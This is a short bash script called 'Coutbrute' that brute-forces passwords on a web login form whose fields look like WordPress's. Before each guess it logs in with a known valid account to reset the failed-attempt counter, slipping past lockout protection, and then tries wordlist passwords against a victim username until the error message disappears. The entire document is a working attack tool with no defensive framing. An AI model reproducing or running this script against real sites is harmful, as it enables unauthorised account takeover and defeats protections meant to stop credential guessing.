#!/bin/bash

echo -e "\n\033[1;93m					Welcome to Coutbrute!  \033[0m \n\n\n\n"

read -p "Enter Valid Login URL : " url
read -p "Enter Known Username : " knownu 
read -p "Enter Known Password For User $knownu : " knownp 
read -p "Enter Username To Brute Force : " vic  
read -p "Enter Path For Wordlist : " wordlist
echo
postreq="curl -iL --fail --data-urlencode  log=$knownu --data-urlencode pwd=$knownp $url"
xpostreq="curl -iL --fail --data-urlencode  log=$vic --data-urlencode pwd=password $url"


while read w; 
do
	echo "Resetting Attempts ..."
	$postreq -s -o /dev/null 
	echo "Done Resetting"
	echo -e "\033[1;93mTrying Password : \033[0m $w"
	newreq=$(echo $xpostreq | sed "s/password/$w/") 
	res=$($newreq -s | grep Error)
	if [[ $res != *"Error"* ]]; then
  		echo -e "\n\n\n					\033[1;92mPASSWORD FOUND : $w \033[92m"
		found=true
		break
	fi
	found=false
done  < $wordlist

if [ "$found" = false ] ; then 
echo -e "\033[1;91mCould Not Find Password \033[0m"
fi
